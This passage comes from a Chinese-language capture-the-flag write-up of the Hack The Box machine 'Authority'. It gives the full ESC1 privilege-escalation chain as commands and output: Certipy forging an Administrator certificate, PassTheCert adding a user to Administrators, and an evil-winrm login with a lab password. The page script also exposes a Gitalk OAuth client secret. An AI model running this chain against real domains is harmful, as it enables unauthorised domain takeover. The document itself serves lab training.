<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> 20230725042904_Certipy.txt<br>Certificate Authorities<br>  0<br>    CA Name                             : AUTHORITY-CA<br>    DNS Name                            : authority.authority.htb<br>    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb<br>    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4<br>    Certificate Validity Start          : 2023-04-24 01:46:26+00:00<br>    Certificate Validity End            : 2123-04-24 01:56:25+00:00<br>    Web Enrollment                      : Disabled<br>    User Specified SAN                  : Disabled<br>    Request Disposition                 : Issue<br>    Enforce Encryption <span class="hljs-keyword">for</span> Requests     : Enabled<br>    Permissions<br>      Owner                             : AUTHORITY.HTB\Administrators<br>      Access Rights<br>        ManageCa                        : AUTHORITY.HTB\Administrators<br>                                          AUTHORITY.HTB\Domain Admins<br>                                          AUTHORITY.HTB\Enterprise Admins<br>        ManageCertificates              : AUTHORITY.HTB\Administrators<br>                                          AUTHORITY.HTB\Domain Admins<br>                                          AUTHORITY.HTB\Enterprise Admins<br>        Enroll                          : AUTHORITY.HTB\Authenticated Users<br>Certificate Templates<br>  0<br>    Template Name                       : CorpVPN<br>    Display Name                        : Corp VPN<br>    Certificate Authorities             : AUTHORITY-CA<br>    Enabled                             : True<br>    Client Authentication               : True<br>    Enrollment Agent                    : False<br>    Any Purpose                         : False<br>    Enrollee Supplies Subject           : True<br>    Certificate Name Flag               : EnrolleeSuppliesSubject<br>    Enrollment Flag                     : IncludeSymmetricAlgorithms<br>                                          PublishToDs<br>                                          AutoEnrollmentCheckUserDsCertificate<br>    Private Key Flag                    : ExportableKey<br>    Extended Key Usage                  : Encrypting File System<br>                                          Secure Email<br>                                          Client Authentication<br>                                          Document Signing<br>                                          IP security IKE intermediate<br>                                          IP security use<br>                                          KDC Authentication<br>    Requires Manager Approval           : False<br>    Requires Key Archival               : False<br>    Authorized Signatures Required      : 0<br>    Validity Period                     : 20 years<br>    Renewal Period                      : 6 weeks<br>    Minimum RSA Key Length              : 2048<br>    Permissions<br>      Enrollment Permissions<br>        Enrollment Rights               : AUTHORITY.HTB\Domain Computers<br>                                          AUTHORITY.HTB\Domain Admins<br>                                          AUTHORITY.HTB\Enterprise Admins<br>      Object Control Permissions<br>        Owner                           : AUTHORITY.HTB\Administrator<br>        Write Owner Principals          : AUTHORITY.HTB\Domain Admins<br>                                          AUTHORITY.HTB\Enterprise Admins<br>                                          AUTHORITY.HTB\Administrator<br>        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins<br>                                          AUTHORITY.HTB\Enterprise Admins<br>                                          AUTHORITY.HTB\Administrator<br>        Write Property Principals       : AUTHORITY.HTB\Domain Admins<br>                                          AUTHORITY.HTB\Enterprise Admins<br>                                          AUTHORITY.HTB\Administrator<br>    [!] Vulnerabilities<br>      ESC1                              : <span class="hljs-string">&#x27;AUTHORITY.HTB\\Domain Computers&#x27;</span> can enroll, enrollee supplies subject and template allows client authentication<br></code></pre></td></tr></table></figure>

<p>我们发现存在ESC1漏洞。直接搜一下如何利用。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11627">这篇文章</a>有介绍。照葫芦画瓢。</p>
<p>先按照上面提供的信息请求一下带有管理员权限的证书。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy req -u <span class="hljs-string">&#x27;exp$&#x27;</span> -p <span class="hljs-string">&#x27;Exp114514&#x27;</span> -target 10.10.11.222 -ca AUTHORITY-CA -template <span class="hljs-string">&#x27;CorpVPN&#x27;</span> -upn <span class="hljs-string">&#x27;Administrator&#x27;</span><br>Certipy v4.3.0 - by Oliver Lyak (ly4k)<br><br>[*] Requesting certificate via RPC<br>[*] Successfully requested certificate<br>[*] Request ID is 5<br>[*] Got certificate with UPN <span class="hljs-string">&#x27;Administrator&#x27;</span><br>[*] Certificate has no object SID<br>[*] Saved certificate and private key to <span class="hljs-string">&#x27;administrator.pfx&#x27;</span><br></code></pre></td></tr></table></figure>

<p>其中<code>-upn</code>用于指定用户主体名 (User Principal Name) 。</p>
<p>然后我们再把获取到的<code>.pfx</code>文件拆成证书和密钥。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy cert -pfx administrator.pfx -nokey -out user.crt<br>Certipy v4.3.0 - by Oliver Lyak (ly4k)<br><br>[*] Writing certificate and  to <span class="hljs-string">&#x27;user.crt&#x27;</span><br><br>$ certipy cert -pfx administrator.pfx -nocert -out user.key<br>Certipy v4.3.0 - by Oliver Lyak (ly4k)<br><br>[*] Writing private key to <span class="hljs-string">&#x27;user.key&#x27;</span><br></code></pre></td></tr></table></figure>

<p>我们可以用 <a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert">passthecert</a>工具登录ldap shell进行管理<del>（提权）</del>操作。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Type <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> list of commands<br><br><span class="hljs-comment"># add_user_to_group svc_ldap Administrators</span><br>Adding user: svc_ldap to group Administrators result: OK<br><br><span class="hljs-comment"># exit</span><br>Bye!<br></code></pre></td></tr></table></figure>

<p>我们将<code>svc_ldap</code>用户添加到管理员组中。</p>
<p>此时我们如果查看一下用户权限会发现并没有加到用户组中，这是因为还没更新，退出重新登录一下就好。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cmd">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; whoami /user<br><br>USER INFORMATION<br>----------------<br><br>User Name    SID<br>============ =============================================<br>htb\svc_ldap S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">622327497</span>-<span class="hljs-number">3269355298</span>-<span class="hljs-number">2248959698</span>-<span class="hljs-number">1601</span><br>*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; <span class="hljs-built_in">net</span> user svc_ldap<br>User name                    svc_ldap<br>Full Name<br>Comment<br>User&#x27;s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">29</span>:<span class="hljs-number">31</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">8</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">29</span>:<span class="hljs-number">31</span> PM<br>Password required            Yes<br>User may change password     No<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   <span class="hljs-number">7</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2023</span> <span class="hljs-number">8</span>:<span class="hljs-number">43</span>:<span class="hljs-number">09</span> PM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Remote Management Use<br>Global Group memberships     *Domain Users<br>The command completed successfully.<br></code></pre></td></tr></table></figure>

<p><code>$ evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!</code></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cmd">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; <span class="hljs-built_in">net</span> user svc_ldap<br>User name                    svc_ldap<br>Full Name<br>Comment<br>User&#x27;s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">29</span>:<span class="hljs-number">31</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">8</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">29</span>:<span class="hljs-number">31</span> PM<br>Password required            Yes<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   <span class="hljs-number">7</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2023</span> <span class="hljs-number">8</span>:<span class="hljs-number">43</span>:<span class="hljs-number">09</span> PM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Administrators       *Remote Management Use<br>Global Group memberships     *Domain Users<br>The command completed successfully.<br></code></pre></td></tr></table></figure>

<p>此时就可以拿到root flag了。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cmd">*Evil-WinRM* PS C:\Users\Administrator&gt; <span class="hljs-built_in">dir</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">    Directory: <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Mode</span>                <span class="hljs-title">LastWriteTime</span>         <span class="hljs-title">Length</span> <span class="hljs-title">Name</span></span><br><span class="hljs-function">----                -------------         ------ ----</span><br><span class="hljs-function"><span class="hljs-title">d</span>-----        8/10/2022   8:52 <span class="hljs-title">PM</span>                .<span class="hljs-title">pwm</span>-<span class="hljs-title">workpath</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                3<span class="hljs-title">D</span> <span class="hljs-title">Objects</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Contacts</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Desktop</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Documents</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Downloads</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Favorites</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Links</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Music</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Pictures</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Saved</span> <span class="hljs-title">Games</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Searches</span></span><br><span class="hljs-function"><span class="hljs-title">d</span>-<span class="hljs-title">r</span>---        7/12/2023   1:21 <span class="hljs-title">PM</span>                <span class="hljs-title">Videos</span></span><br><span class="hljs-function">-<span class="hljs-title">a</span>----        3/17/2023   9:30 <span class="hljs-title">AM</span>          16384 <span class="hljs-title">gp.jfm</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">*<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>&gt; <span class="hljs-title">cd</span> <span class="hljs-title">Desktop</span></span><br><span class="hljs-function"><span class="hljs-title">di</span>*<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">dir</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">    <span class="hljs-title">Directory</span>: <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Mode</span>                <span class="hljs-title">LastWriteTime</span>         <span class="hljs-title">Length</span> <span class="hljs-title">Name</span></span><br><span class="hljs-function">----                -------------         ------ ----</span><br><span class="hljs-function">-<span class="hljs-title">ar</span>---        7/25/2023   9:44 <span class="hljs-title">AM</span>             34 <span class="hljs-title">root.txt</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">*<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br></code></pre></td></tr></table></figure>

<p>成功拿下。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要考察了对LDAP的理解，学到了很多东西。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/24/Only4You/">[HTB]  Only4You Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">其他扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">服务渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb"><span class="toc-number">3.1.</span> <span class="toc-text">smb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWM"><span class="toc-number">3.2.</span> <span class="toc-text">PWM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ansible-vault%E5%AF%86%E6%96%87%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.2.1.</span> <span class="toc-text">Ansible_vault密文破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PWM%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.2.</span> <span class="toc-text">PWM配置文件利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ldap%E7%9B%91%E5%90%AC"><span class="toc-number">3.2.3.</span> <span class="toc-text">ldap监听</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%B0root"><span class="toc-number">4.1.</span> <span class="toc-text">提权到root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>